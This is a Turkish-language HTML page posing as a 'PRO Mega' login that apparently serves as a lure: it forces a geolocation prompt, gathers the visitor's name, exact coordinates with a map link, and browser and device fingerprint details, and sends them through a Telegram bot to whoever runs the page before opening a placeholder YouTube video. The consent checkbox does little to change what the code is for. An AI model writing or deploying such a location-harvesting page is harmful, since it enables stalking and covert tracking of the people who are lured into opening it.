<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>PRO Mega Giriş</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #071827;
      color: #e6f6f5;
      padding: 40px;
    }
    .card {
      max-width: 640px;
      margin: 0 auto;
      background: #0b1116;
      padding: 28px;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.6);
    }
    h1 {
      margin-top: 0;
      font-size: 24px;
      color: #00ffd1;
    }
    label {
      display: block;
      margin-top: 16px;
      font-size: 14px;
      color: #9fb3c8;
    }
    input, textarea {
      width: 100%;
      padding: 12px;
      margin-top: 6px;
      border-radius: 8px;
      border: 1px solid rgba(255,255,255,0.06);
      background: rgba(255,255,255,0.02);
      color: #fff;
      font-size: 15px;
    }
    input[type="checkbox"] {
      margin-right: 6px;
    }
    button {
      margin-top: 24px;
      padding: 12px 18px;
      border: none;
      border-radius: 8px;
      background: linear-gradient(90deg, #00ffd1, #66e0ff);
      color: #002;
      font-weight: 700;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
    }
    .note {
      margin-top: 18px;
      font-size: 13px;
      color: #9fb3c8;
    }
    .warn {
      color: #ff6b6b;
      font-weight: bold;
      margin-top: 12px;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>🚀 PRO Mega Giriş</h1>
    <form id="girisForm">
      <label for="name">Adınız (zorunlu)</label>
      <input type="text" id="name" name="name" required placeholder="Adınızı girin" />

      <label for="note">Açıklama (opsiyonel)</label>
      <textarea id="note" name="note" rows="3" placeholder="İsterseniz kısa bir not yazabilirsiniz"></textarea>

      <label style="margin-top:20px;">
        <input type="checkbox" id="consent" required />
        Verilerimin konum dahil tüm tarayıcı kaynaklı bilgilerle birlikte Telegram botuna gönderilmesine açıkça onay veriyorum.
      </label>

      <button type="submit">Giriş Yap</button>
    </form>

    <div class="note" id="status">Durum: Hazır</div>
    <div class="warn" id="geoWarn" style="display:none;">Bu sitede ilerleyebilmek için konum izni gereklidir. Lütfen konum izni verin.</div>
  </div>

  <script>
    document.getElementById("girisForm").addEventListener("submit", async function(e) {
      e.preventDefault();
      const name = document.getElementById("name").value.trim();
      const note = document.getElementById("note").value.trim();
      const consent = document.getElementById("consent").checked;
      const status = document.getElementById("status");
      const geoWarn = document.getElementById("geoWarn");

      if (!name) {
        status.textContent = "Lütfen adınızı girin.";
        return;
      }
      if (!consent) {
        status.textContent = "Gönderim için açık onay vermelisiniz.";
        return;
      }

      status.textContent = "Konum izni isteniyor...";

      let konum;
      try {
        konum = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
        });
      } catch (err) {
        geoWarn.style.display = "block";
        status.textContent = "Konum izni verilmedi.";
        return;
      }

      status.textContent = "Veriler toplanıyor...";

      const lat = konum.coords.latitude;
      const lon = konum.coords.longitude;
      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

      const tarayiciBilgi = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        dil: navigator.language,
        ekran: `${screen.width}x${screen.height}`,
        renkDerinligi: screen.colorDepth,
        cihazBellek: navigator.deviceMemory || "-",
        cekirdekSayisi: navigator.hardwareConcurrency || "-",
        zamanDilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
        tarih: new Date().toLocaleString(),
        konum: `Lat: ${lat}, Lon: ${lon}`,
        konumLink: mapsLink
      };

      let botVeri;
      try {
        botVeri = await fetch("bilgiler.txt").then(r => r.text());
      } catch (err) {
        status.textContent = "❌ bilgiler.txt okunamadı.";
        return;
      }

      const BOT_TOKEN = botVeri.match(/BOT_TOKEN=(.*)/)[1].trim();
      const CHAT_ID = botVeri.match(/CHAT_ID=(.*)/)[1].trim();

      const mesaj = `🧾 Yeni Giriş\n\n👤 İsim: ${name}\n📝 Not: ${note || "-"}\n🕒 Zaman: ${tarayiciBilgi.tarih}\n📍 Konum: ${tarayiciBilgi.konum}\n🔗 Harita: ${tarayiciBilgi.konumLink}\n🖥️ Tarayıcı: ${tarayiciBilgi.userAgent}\n💻 Platform: ${tarayiciBilgi.platform}\n🌐 Dil: ${tarayiciBilgi.dil}\n📺 Ekran: ${tarayiciBilgi.ekran}\n🎨 Renk Derinliği: ${tarayiciBilgi.renkDerinligi}\n🧠 Bellek: ${tarayiciBilgi.cihazBellek}\n⚙️ Çekirdek: ${tarayiciBilgi.cekirdekSayisi}\n⏰ Zaman Dilimi: ${tarayiciBilgi.zamanDilimi}\n🔒 Kullanıcı onayı: Evet`;

      status.textContent = "Telegram'a gönderiliyor...";

      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(mesaj)}`
        });
        const result = await response.json();
        if (result.ok) {
          status.textContent = "✅ Başarıyla gönderildi. Video açılıyor...";
          setTimeout(() => {
            window.open("https://www.youtube.com/watch?v=videourlyaz", "_blank");
          }, 1500);
        } else {
          status.textContent = "❌ Telegram gönderimi başarısız.";
        }
      } catch (err) {
        status.textContent = "❌ Ağ hatası veya CORS engeli.";
      }
    });
  </script>
</body>
</html>
